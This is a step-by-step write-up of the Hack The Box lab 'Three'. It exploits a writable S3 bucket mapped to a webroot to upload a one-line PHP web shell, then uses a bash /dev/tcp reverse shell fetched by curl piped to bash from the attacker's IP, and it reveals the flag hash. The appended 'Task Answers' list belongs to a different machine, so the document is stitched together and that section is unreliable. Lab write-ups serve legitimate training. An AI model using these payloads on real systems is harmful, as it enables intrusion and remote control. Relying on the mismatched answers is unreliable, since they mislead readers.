# 🧪 Hack The Box: Three

> 🔗 https://app.hackthebox.com/machines/Three

## 🎯 Goal
Gain access through:
Virtual host discovery → S3 misconfiguration → PHP upload → RCE → reverse shell

---

# 🧠 Attack Chain

```text
nmap → web enum → vhost discovery → S3 access → PHP upload → RCE → reverse shell → flag
```

---

# 🔍 Step 1 — Scan Target

```bash
nmap -sC -sV <TARGET_IP>
```

## Command explanation
- `nmap` → network scanner
- `-sC` → run default NSE scripts
- `-sV` → detect service versions

## Why this matters
We need:
- open ports
- running services
- technology stack

## Result
- Port 80 → HTTP
- Port 22 → SSH

## What we learn
- Apache/Ubuntu stack
- Linux web server
- SSH available but no credentials

## Defense
- firewall unused ports
- disable unnecessary services
- hide service versions

---

# 🌐 Step 2 — Web Enumeration

Open:

```bash
http://<TARGET_IP>
```

View source code (`Ctrl+U`).

## Findings

### PHP backend

```php
/action_page.php
```

Why important:
- `.php` means PHP is processed server-side
- possible file upload or code execution opportunities

### Email address

```text
mail@thetoppers.htb
```

## Why important
Internal domain discovered:

```text
thetoppers.htb
```

We must resolve it locally.

---

# 🧩 Add Domain to Hosts

```bash
echo "10.10.10.10 thetoppers.htb" >> /etc/hosts
```

## Command explanation
- `echo` → print text
- `>>` → append to file
- `/etc/hosts` → local hostname resolver

## Why this works
Linux checks:

```text
/etc/hosts
```

before DNS servers.

This forces the system to resolve:
```text
thetoppers.htb → 10.10.10.10
```

## Defense
- avoid leaking internal domains
- isolate internal infrastructure

---

# 🧪 Step 3 — Virtual Host Discovery

```bash
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
```

## Command explanation
- `vhost` → brute-force virtual hosts
- `-w` → wordlist
- `-u` → target URL
- `--append-domain` → append `.thetoppers.htb`

## Why this works
Web servers often host:
- hidden apps
- admin panels
- internal services

using Host headers.

## Result

```text
Found: s3.thetoppers.htb
```

Add it:

```bash
echo "10.10.10.10 s3.thetoppers.htb" >> /etc/hosts
```

## Defense
- disable unused vhosts
- restrict internal services

---

# ☁️ Step 4 — Identify S3 Service

Open:

```bash
http://s3.thetoppers.htb
```

## Result

```json
{"status":"running"}
```

## What this means
LocalStack is running.

LocalStack emulates AWS cloud services locally:
- S3
- Lambda
- DynamoDB
etc.

Here it exposes:
```text
Amazon S3 compatible storage
```

---

# 🔑 Step 5 — Configure AWS CLI

```bash
aws configure
```

## Why needed
AWS CLI requires:
- credentials
- region
- output format

even in lab environments.

## Example

```text
Access Key ID: test
Secret Access Key: test
Region: us-east-1
Output format: json
```

---

# 📦 List S3 Buckets

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls
```

## Command explanation
- `--endpoint-url` → custom S3 endpoint
- `s3 ls` → list buckets

## Result

```text
thetoppers.htb
```

---

# 📂 List Bucket Contents

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

## Result

```text
index.html
css/
js/
```

## Why this matters
The bucket is:
- public
- writable
- mapped to Apache webroot

👉 Critical cloud misconfiguration.

## Defense
- disable public write access
- separate uploads from webroot
- least privilege IAM

---

# 💥 Step 6 — Upload PHP Web Shell

## Create shell

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

## Code explanation
- `$_REQUEST["cmd"]` → gets URL parameter
- `system()` → executes OS commands
- `shell.php?cmd=id` → runs `id`

## Upload shell

```bash
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/
```

## Command explanation
- `s3 cp` → copy file into bucket

## Execute shell

```bash
curl http://thetoppers.htb/shell.php?cmd=id
```

## Why this works
Apache executes PHP files inside webroot.

## Result

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ Remote Code Execution achieved.

## Defense
- block PHP uploads
- MIME validation
- disable dangerous PHP functions

---

# 🖥️ Step 7 — Reverse Shell

## Get your IP

```bash
ip a
```

## Why
Victim machine needs attacker IP for callback.

---

# 📄 Create Payload

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' > shell.sh
```

## Payload explanation

### `#!/bin/bash`
Use bash interpreter.

### `bash -i`
Interactive shell:
- allows command execution
- supports terminal interaction

### `>&`
Redirect stdout/stderr.

### `/dev/tcp/IP/PORT`
Special bash feature:
- opens raw TCP connection

### `0>&1`
Redirect stdin to socket.

👉 Final result:
Interactive shell over TCP.

---

# 🎧 Start Listener

```bash
nc -lvnp 4444
```

## Command explanation
- `nc` → netcat
- `-l` → listen mode
- `-v` → verbose
- `-n` → no DNS resolution
- `-p 4444` → listen on port 4444

---

# 🌍 Host Payload

```bash
python3 -m http.server 8000
```

## Why
Quick temporary HTTP server to deliver payload.

## Explanation
- `-m` → run Python module
- `http.server` → built-in web server
- `8000` → listening port

---

# 🚀 Execute Reverse Shell

```bash
curl "http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP>:8000/shell.sh%20%7C%20bash"
```

## URL encoding
- `%20` → space
- `%7C` → `|`

## What happens
Victim executes:

```bash
curl http://<YOUR_IP>:8000/shell.sh | bash
```

Meaning:
1. download payload
2. pipe into bash
3. execute immediately

---

# 🚩 Step 8 — Retrieve Flag

```bash
cat /var/www/flag.txt
```

## Explanation
- `cat` → print file contents

## Result

<details>
<summary>Show answers</summary>

a980d99281a28d638ac68b9bf9453c2b

</details>

---

# 🛡️ Defensive Lessons

## Main issue
Public writable S3 bucket mapped directly into webroot.

## Secure design
- private buckets
- upload validation
- no executable uploads
- WAF/EDR
- network segmentation
- outbound traffic filtering

---

# 🧠 Key Takeaway

This machine teaches:
- virtual host discovery
- local DNS manipulation
- S3 enumeration
- cloud misconfiguration abuse
- PHP RCE
- reverse shell fundamentals

👉 Misconfiguration is often more dangerous than advanced exploits.


---
## 📋 Task Answers

<details>
<summary>Show answers</summary>

1. unika.htb  
2. php  
3. page  
4. ../../../../windows/system32/drivers/etc/hosts  
5. //IP/file  
6. New Technology Lan Manager  
7. -I  
8. John The Ripper  
9. badminton  
10. 5985  
11. mike  

</details>

